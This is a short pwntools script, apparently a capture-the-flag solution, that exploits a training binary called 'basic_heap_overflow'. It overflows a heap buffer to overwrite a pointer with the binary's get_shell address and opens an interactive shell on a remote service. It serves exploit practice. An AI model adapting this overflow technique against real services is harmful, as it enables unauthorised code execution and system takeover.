from pwn import *

p = remote(ADDRESS, PORT)
#p = process("./basic_heap_overflow")
e = ELF('./basic_heap_overflow')

get_shell = e.symbols['get_shell']

payload = b'A' * (0x804b1c8 - 0x804b198 - 8) + p32(get_shell)
p.sendline(payload)
p.interactive()